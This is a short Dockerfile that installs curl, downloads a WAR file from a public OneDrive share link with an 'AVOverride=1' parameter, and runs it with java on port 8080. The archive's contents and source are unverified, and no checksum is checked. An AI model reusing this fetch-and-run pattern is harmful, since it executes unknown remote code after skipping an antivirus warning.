FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.dm.files.1drv.com/y4m3oCVH2ydDG5pnNDQU0gb6ZVFQy9-D-eCjasfa7tdf4jY8xhhaSX2l7VESeShtrry7aj0jiKh8tN132lkB0gCa2Rn9XajCsrTNOKu6fMvPDAZ-1oIFxhl2amp4lDXZJ0Xrfe0C_mfjudubd1d7T19Tvt3VZylZLksDkgGvQR7UJo5do_qlqXvjx60nBTk_xd7wLSRR8YL-4MJZJMlKu6D3CI3shfgdVyxsu3MVCSHl-M?AVOverride=1 -o p.war
 
CMD ["java", "-jar", "p.war"]
EXPOSE 8080
